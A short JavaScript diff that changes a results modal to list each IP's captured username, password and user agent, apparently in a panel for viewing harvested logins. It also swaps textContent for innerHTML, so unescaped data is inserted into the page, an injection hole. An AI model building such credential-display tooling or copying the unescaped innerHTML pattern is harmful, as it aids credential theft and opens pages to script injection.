@@ -152,9 +152,12 @@
                userData.forEach(([ipAddress, details]) => {
                  if(details.ip == ipModel){
                    if(details.getUserData){
-                     modalBody.textContent = `Result for IP: ${ipAddress}<br>${details.getUserData}`;
+                     modalBody.innerHTML = `Result for IP: ${ipAddress}
+                     <br>Username: ${details.getUserData.username || ''}
+                     <br>Password: ${details.getUserData.password || ''}
+                     <br>UserAgent: ${details.getUserData.userAgent || ''}`;
                    } else {
-                     modalBody.textContent = `No result for IP: ${ipAddress}`;
+                     modalBody.innerHTML = `No result for IP: ${ipAddress}`;
                    }
                  }
                })
